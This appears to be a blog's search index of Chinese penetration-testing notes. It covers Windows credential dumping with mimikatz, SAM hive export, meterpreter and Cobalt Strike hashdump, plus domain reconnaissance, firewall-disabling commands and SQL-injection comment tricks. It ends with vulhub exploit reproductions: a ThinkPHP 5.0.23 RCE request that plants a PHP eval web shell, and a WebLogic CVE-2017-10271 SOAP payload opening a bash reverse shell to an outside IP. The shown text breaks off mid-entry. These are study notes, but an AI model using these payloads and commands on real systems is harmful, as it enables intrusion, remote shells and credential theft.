<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windows密码凭证获取</title>
      <link href="2021/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/"/>
      <url>2021/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>学习笔记</p><a id="more"></a><h2 id="windows本地认证"><a href="#windows本地认证" class="headerlink" title="windows本地认证"></a>windows本地认证</h2><ol><li>用户输入密码</li><li>系统收到密码后将用户输入的密码计算为NTLM hash</li><li>与sam数据库中该用户的hash进行对比</li><li>相同则登陆成功，不相同则登陆失败</li></ol><p>本地认证中用来处理用户输入密码的进程为lsass.exe密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行对比，我们使用mimikatz来获取的明文密码，便是这个进程中读到的。</p><h2 id="获取凭证的姿势"><a href="#获取凭证的姿势" class="headerlink" title="获取凭证的姿势"></a>获取凭证的姿势</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>privilege::debug  //提升权限<br>inject::process lsass.exe sekurlsa.dll //注入sekurlas.dll到lsass.exe进程里<br>sekurlsa::logonpasswords //获取密码</p><h3 id="powershell脚本"><a href="#powershell脚本" class="headerlink" title="powershell脚本"></a>powershell脚本</h3><p>这种方法的优点是无文件落地.</p><p>powershell远程加载minikatz<br>powershell加载Get-PassHashes脚本</p><h3 id="pwdump7"><a href="#pwdump7" class="headerlink" title="pwdump7"></a>pwdump7</h3><h3 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h3><p>用于解密哈希<br><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p><h3 id="Procdump-mimikatz联合"><a href="#Procdump-mimikatz联合" class="headerlink" title="Procdump + mimikatz联合"></a>Procdump + mimikatz联合</h3><p>使用procdump lsass进程导出，再用miniikatz还原密码 </p><h3 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h3><pre class="line-numbers language-none"><code class="language-none">reg save HKLM\SYSTEM system.hivreg save HKLM\SAM sam.hivreg save HKLM\SECURITY security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>导出后可以试用cain导出system.hiv、security.hiv获取缓存中的明文信息。</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::sam &#x2F;system:system.hiv &#x2F;sam:sam.hiv&quot; exitpython secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p><h3 id="meterpreter获取Hash"><a href="#meterpreter获取Hash" class="headerlink" title="meterpreter获取Hash"></a>meterpreter获取Hash</h3><pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;hashdump set sesion 1exploiit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Hashdump使用的是mimikatz的部分功能<br>Load mimikatz<br>获取用户密码的hash值<br>wdigest 、kerberos 、msv 、ssp 、tspkg 、livessp<br>mimikatz_command -h<br>mimikatz_command -f :: //查询有哪些模块<br>mimikatz_command -f samdump::hashes //从windows的sam文件中读取密码hash值<br>mimikatz_command -f sekurlsa::searchPasswords //获取明文密码<br>mimikatz_command -f samdump::bootkey</p><p>msf6：</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt;load kiwimeterpreter &gt; help kiwi列举系统中的明文密码meterpreter &gt; creds_all读取sam文件meterpreter &gt; lsa_dump_samkiwi_cmd命令后面接mimikatz.exe的命令meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="cs获取Hash"><a href="#cs获取Hash" class="headerlink" title="cs获取Hash"></a>cs获取Hash</h3><p>主机上线后获取hash</p><pre class="line-numbers language-none"><code class="language-none">beacon&gt; hashdumpbeacon&gt; logonpasswordsbeacon&gt; mimikatz sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域学习笔记</title>
      <link href="2021/%E5%9F%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2021/%E5%9F%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="域的基本概念"><a href="#域的基本概念" class="headerlink" title="域的基本概念"></a>域的基本概念</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域是windows的网络操作系统的安全边界，域内主机各种策略由域控制器统一设定，域中所有主机共享一个集中式的目录数据库，包含着整个域内的对象。父域和子域之间构成域树，多个域树构成域林，林中的第一个被创建的域，作为该林的根域。windows NT中，名称空间是平行的，尽管可以将NT域配置为彼此信任，但每个域都是一个完全独立的实体。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域成员计算机在登录的时候可以选择登录到域中或此计算机。登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，而登陆到此计算机时，是通过SAM来进行NTLM验证的。默认情况下，域用户可以登录到域中所有的工作站，不包括域控制器，管理员也可以指定具体的计算机，域用户信息保存在活动目录中。</p><h2 id="域控DC-Domain-Control"><a href="#域控DC-Domain-Control" class="headerlink" title="域控DC(Domain Control)"></a>域控DC(Domain Control)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在域架构中域控是用来管理所有客户端的服务器，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都得经过它的审核。 域控是域架构的核心，每个域控制器上都包含了AD活动目录数据库。一个域中可能要有至少两个域控。一个作为DC，一个是备份DC。</p><h2 id="常用的域信息收集"><a href="#常用的域信息收集" class="headerlink" title="常用的域信息收集"></a>常用的域信息收集</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">### net组件</span><span class="token comment">#查询域</span>net view /domain<span class="token comment">#查询域内的所有计算机</span>net view /domain:de1ay<span class="token comment">#查询域内所有用户组（Enterprise Admins组权限最大）</span>net group /domain<span class="token comment">#查看域管理员的用户组</span>net group <span class="token string">"domain admins"</span> /domain<span class="token comment">#查询所有域成员计算机列表</span>net group <span class="token string">"domain computers"</span> /domain<span class="token comment">#查询域系统管理员用户组</span>net group <span class="token string">"Enterprise admins"</span> /domain<span class="token comment">#查看域控制器</span>net group <span class="token string">"domain controllers"</span> /domain<span class="token comment">#对比查看"工作站域DNS名称(域名)"和"登录域()域控制器"的信息是否相匹配</span>net config workstation<span class="token comment">#查看域内所有账号</span>net user /domain<span class="token comment">#查询指定用户的详情信息</span>net user xxx /domain<span class="token comment">#查看时间可以找到域控</span>net <span class="token function">time</span> /domain查看域密码策略net accounts /domain<span class="token comment">#查看当前登录域</span>net config workstation<span class="token comment">#登录本机的域管理员</span>net localgroup administrators /domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ipconfigipconfig /all<span class="token comment">#查询dns解析记录</span><span class="token function">nslookup</span> -type<span class="token operator">=</span>all _ldap._tcp.dc._msdcs.mingy.com<span class="token comment">#spn扫描</span>在SPN扫描结果中可以通过如下内容，来进行域控的定位。setspn -q */*setspn -T mingy.com -q */*<span class="token assign-left variable">CN</span><span class="token operator">=</span>DC,OU<span class="token operator">=</span>Domain Controllers,DC<span class="token operator">=</span>mingy,DC<span class="token operator">=</span>comnet groupnet group <span class="token string">"domain controllers"</span> /domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过端口来识别域控<br>端口：389<br>服务：LDAP、ILS<br>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。<br>端口：53<br>服务：Domain Name Server（DNS）<br>说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。   </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看域内信任关系</span>nltest /domain_trusts<span class="token comment">#查看域控制器的机器名</span>nltest /DCLIST:MINGY<span class="token comment">#查看域内邮件服务器</span><span class="token function">nslookup</span> -q<span class="token operator">=</span>mx mingy.com<span class="token comment">#查看域内DNS服务器</span><span class="token function">nslookup</span> -q<span class="token operator">=</span>ns mingy.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主机信息收集</title>
      <link href="2021/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2021/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>学习笔记</p><a id="more"></a><h2 id="内网环境分析"><a href="#内网环境分析" class="headerlink" title="内网环境分析"></a>内网环境分析</h2><ul><li>内网基础环境判断：IP、网关、DNS、host文件、端口、服务、代理等</li><li>主机所在位置：办公区、核心DB、生产区等</li><li>主机充当的角色：普通服务器、办公电脑、文件服务器、代理服务器等</li><li>进出口流量分析：通常可以判断防火墙等安全策略，检查流量和端口限制<ul><li>TCP协议：<ul><li>vps：nc -lvvp 8080</li><li>target：nc vps -ip 8888</li></ul></li><li>HTTP协议：<ul><li>target：curl vps-ip 80</li></ul></li><li>ICMP协议：<ul><li>ping命令</li></ul></li><li>DNS协议：<ul><li>target： nslookup <a href="http://www.baidu.com/">www.baidu.com</a> vps-ip</li><li>dig @vsp-ip <a href="http://www.baidu.com/">www.baidu.com</a></li></ul></li></ul></li></ul><h2 id="信息收集手段"><a href="#信息收集手段" class="headerlink" title="信息收集手段"></a>信息收集手段</h2><ol><li>内网网段扫描</li><li>文件共享、FTP连接记录、浏览器访问记录等</li><li>R&amp;S信息</li></ol><h2 id="信息收集常用命令"><a href="#信息收集常用命令" class="headerlink" title="信息收集常用命令"></a>信息收集常用命令</h2><h3 id="用户信息收集"><a href="#用户信息收集" class="headerlink" title="用户信息收集"></a>用户信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看本机用户列表</span>net user<span class="token comment">#获取本地管理员信息</span>net localgroup administrators<span class="token comment">#查看当前在线用户和会话</span>quserquery userquery user <span class="token operator">||</span> qwinsta<span class="token comment">#查当前用户在目标系统中的具体权限</span><span class="token function">whoami</span> /all<span class="token comment">#查看当前权限</span><span class="token function">whoami</span> <span class="token operator">&amp;&amp;</span> <span class="token function">whoami</span> /priv<span class="token comment">#查当前机器中所有的组名</span>net localgroup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查询网络配置信息。</span>ipconfig /all<span class="token comment">#查询操作系统及软件信息</span>systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS Name"</span> /C:<span class="token string">"OS Version"</span> <span class="token comment"># 英文系统</span>systeminfo <span class="token operator">|</span> findstr /B /C:<span class="token string">"OS 名称"</span> /C:<span class="token string">"OS 版本"</span> <span class="token comment">#中文系统</span><span class="token comment">#查看当前系统版本</span>wmic OS get Caption,CSDVersion,OSArchitecture,Version<span class="token comment">#查看系统体系结构</span><span class="token builtin class-name">echo</span> %PROCESSOR_ARCHITECTURE%<span class="token comment">#查询本机服务信息</span>wmic <span class="token function">service</span> list brief<span class="token comment">#查看安装的软件的版本、路径等</span>wmic product get name, versionpowershell <span class="token string">"Get-WmiObject -class Win32_Product |Select-Object -Property name, version"</span><span class="token comment">#查询进程信息</span>tasklistwmic process list brief<span class="token comment">#查看启动程序信息</span>wmic startup get command,caption<span class="token comment">#查看主机开机时间</span>net statistics workstation<span class="token comment">#列出或断开本地计算机与所连接的客户端的对话</span>net session<span class="token comment">#查看远程连接信息</span>cmdkey /l<span class="token comment">#查看补丁列表</span>systeminfo <span class="token operator">|</span> findstr KB<span class="token comment">#查看补丁的名称、描述、ID、安装时间等</span>wmic qfe get Caption,Description,HotFixID,InstalledOn<span class="token comment">#查看杀软</span>WMIC /Node:localhost /Namespace:<span class="token punctuation">\</span><span class="token punctuation">\</span>root<span class="token punctuation">\</span>SecurityCenter2 Path AntiVirusProduct Get displayName/Format:List<span class="token comment">#查看本地密码策略</span>net accounts<span class="token comment">#查看hosts文件：</span><span class="token function">cat</span> /etc/hosts <span class="token comment"># linux</span><span class="token builtin class-name">type</span> c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hosts  <span class="token comment"># windows</span><span class="token comment">#查看dns缓存（仅windows）</span>ipconfig /displaydns <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看本地密码策略</span><span class="token comment">#查看本机所有的tcp,udp端口连接及其对应的pid</span><span class="token function">netstat</span> -ano<span class="token comment">#查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span><span class="token function">netstat</span> -anob<span class="token comment">#查看路由表和arp缓存</span>route printarp -a<span class="token comment">#查看本机共享列表和可访问的域共享列表 （445端口）</span>net sharewmic share get name,path,status<span class="token comment">#磁盘映射</span>net use k: <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="防火墙信息收集"><a href="#防火墙信息收集" class="headerlink" title="防火墙信息收集"></a>防火墙信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#关闭防火墙(Windows Server 2003 以前的版本)</span>netsh firewall <span class="token builtin class-name">set</span> opmode disable<span class="token comment">#关闭防火墙(Windows Server 2003 以后的版本)</span>netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off<span class="token comment">#查看防火墙配置(netsh命令也可以用作端口转发)</span>netsh firewall show config<span class="token comment">#查看配置规则</span>netsh advfirewall firewall show rule <span class="token assign-left variable">name</span><span class="token operator">=</span>all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对SQL注入过程在注释方式的思考</title>
      <link href="2021/%E5%AF%B9SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B%E5%9C%A8%E6%B3%A8%E9%87%8A%E6%96%B9%E5%BC%8F%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>2021/%E5%AF%B9SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B%E5%9C%A8%E6%B3%A8%E9%87%8A%E6%96%B9%E5%BC%8F%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>初学sql注入，一点思考！</p><a id="more"></a><p>在mysq语句中注释符为<code>#</code>，<code>--空格</code>，<code>/**/</code>，<br>然而http请求中#用来指导浏览器动作的，实际传输中#及后面的内容不会包含在实际的请求中，<br>使用‘–空格’时，url中以空格为结尾则会自动忽略掉空格，因此实际传输的只有‘–’，<br>/**/显然不适用与sql注入过程.</p><p>因此就有了想办法构造出‘#’和‘–空格’的办法</p><ul><li>可以采用#的url编码’%23‘来代替。</li><li>利用url规范问题，‘+’会被解析为空格，因此用‘–+’构造出‘–空格’</li><li>同时我们也可以采用’–%20‘构造‘–空格’</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp 5.0.23 rce 漏洞复现</title>
      <link href="2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>thinkphp 5.0.23 rce漏洞利用</p><a id="more"></a><h2 id="thinkphp介绍"><a href="#thinkphp介绍" class="headerlink" title="thinkphp介绍"></a>thinkphp介绍</h2><p>thinkphp是一个快速、兼容而且简单的轻量级国产php开发框架，支持windows/Unix/linux等服务器环境，并且有相当多的CMS是在thinkphp基础上二次开发的。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<a href="https://github.com/vulhub/vulhub">vulhub</a>搭建环境，过程不赘述。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>抓包并直接发送下面的流量包，即可利用漏洞进行远程代码执行</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1Host: IP:PORTAccept-Encoding: gzip, deflateAccept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 79_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发包可见，命令执行成功</p><div align="center"><p><img src="/2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/0.1.png"></p></div><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>利用命令执行写入一句话木马，注意一个坑，$符号会被过滤掉，原因不明，因此需要$进行转义：<code>echo &quot;&lt;?php @eval(\$_POST[&#39;dack&#39;])?&gt;&quot; &gt; 7.php</code></p><div align="center"><p><img src="/2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p></div>通过蚁剑进行连接，成功获取shell。<div align="center"><p><img src="/2021/thinkphp5.0.23rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic(CVE-2017-10271)漏洞复现</title>
      <link href="2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>CVE-2017-10271学习</p><a id="more"></a><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中</p><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul><li>端口：7001</li><li>界面：Error 404–Not Found<h3 id="XML-Decoder反序列化漏洞（CVE-2017-10271）"><a href="#XML-Decoder反序列化漏洞（CVE-2017-10271）" class="headerlink" title="XML Decoder反序列化漏洞（CVE-2017-10271）"></a>XML Decoder反序列化漏洞（CVE-2017-10271）</h3>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<a href="https://github.com/vulhub/vulhub">vulhub</a>搭建环境，详细搭建过程查看Readme吧。访问目标站点：<a href="http://159.75.42.65:7001/,%E6%98%BE%E7%A4%BA%E4%B8%8B%E9%9D%A2%E7%95%8C%E9%9D%A2%E5%8D%B3%E4%B8%BA%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F%E3%80%82">http://159.75.42.65:7001/,显示下面界面即为搭建成功。</a></p><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p></div><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="目录检测"><a href="#目录检测" class="headerlink" title="目录检测"></a>目录检测</h3><p>根据资料显示，访问<a href="http://159.75.42.65:7001/wls-wsat/CoordinatorPortType11">http://159.75.42.65:7001/wls-wsat/CoordinatorPortType11</a> 目录，显示如下则可能存在此漏洞。</p><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p></div><h3 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h3><p>使用Java反序列化工具，可以成功检测出漏洞存在</p><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p></div><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>方法一：<br>在服务器上开启监听进程</p><div align="center"><p><img src="/2021/Weblogic(CVE-2017-10271)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p></div><p>burpsuit抓包，将请求改为POST并将包内容改为如下</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 640<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soapenv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">work:</span>WorkContext</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>work</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://bea.com/2004/06/soap/workarea/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.4.0<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>bash -i <span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span> /dev/tcp/124.71.172.229/9999 0<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">work:</span>WorkContext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Header</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soapenv:</span>Body</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soapenv:</span>Envelope</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div align="center"><p><img 